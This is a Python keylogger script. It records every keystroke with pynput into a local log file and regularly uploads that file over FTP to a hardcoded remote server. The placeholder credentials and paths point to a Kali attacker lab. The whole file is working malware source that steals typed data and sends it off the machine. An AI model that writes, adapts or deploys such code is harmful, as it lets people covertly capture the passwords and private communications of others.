from pynput import keyboard
from ftplib import FTP
import time
import os

file_name = "keylogger/log.txt"
ftp_server = "192.168.1.64"  # Replace with your server's IP
ftp_user = "kali"          # Replace with your FTP username
ftp_pass = "kali"          # Replace with your FTP password
upload_path = "/home/kali/Desktop/"      # Directory on the server to upload files

def upload_file():
    try:
        with FTP(ftp_server) as ftp:
            ftp.login(ftp_user, ftp_pass)
            with open(file_name, "rb") as file:
                ftp.cwd(upload_path)
                ftp.storbinary(f"STOR {file_name.split('/')[-1]}", file)
            print("File uploaded successfully.")
    except Exception as e:
        print(f"Failed to upload file: {e}")

def keyPressed(key):
    clean_string = str(key).replace("'", "")
    with open(file_name, "a") as file:
        if clean_string == "Key.enter":
            file.write("\n")
        elif clean_string == "Key.space":
            file.write(" ")
        elif clean_string == "Key.backspace":
            file.seek(0, 2)
            file.seek(file.tell() - 1, 0)
            file.truncate()
        else:
            file.write(clean_string)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    print("Keylogger started. Press Ctrl+C to stop.")

    test_length = 100
    # Periodically upload file
    try:
        while True:
          if os.path.exists(file_name):
            txt_length = os.path.getsize(file_name)
            if txt_length >= test_length:
              upload_file()
              test_length += 100
              print("File uploaded.")
    except KeyboardInterrupt:
        print("Keylogger stopped.")
